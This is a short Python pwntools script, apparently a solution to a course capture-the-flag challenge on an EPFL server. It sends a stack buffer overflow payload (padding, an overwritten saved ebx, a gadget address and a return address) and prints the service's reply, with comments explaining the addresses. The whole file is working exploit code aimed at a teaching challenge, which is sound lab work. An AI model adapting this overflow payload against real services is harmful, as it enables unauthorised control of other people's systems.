from pwn import *

p=remote("cs412-ctf.epfl.ch", 10007)
p.recvline_contains("attacking").decode("utf-8")


padding="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
saved_ebx ="\xec\x88\x04\x08"
address_0xd="\xa8\x8a\x04\x08"
return_address="\xec\x88\x04\x08"

p.sendline(padding + saved_ebx + address_0xd + return_address)
p.recvline()
print(p.recvline(keepends=False).decode("utf-8"))


#0x080488ec is new return address
#0x080488ec to restore ebx to got
#08048aa8 to change ebp to recover a 13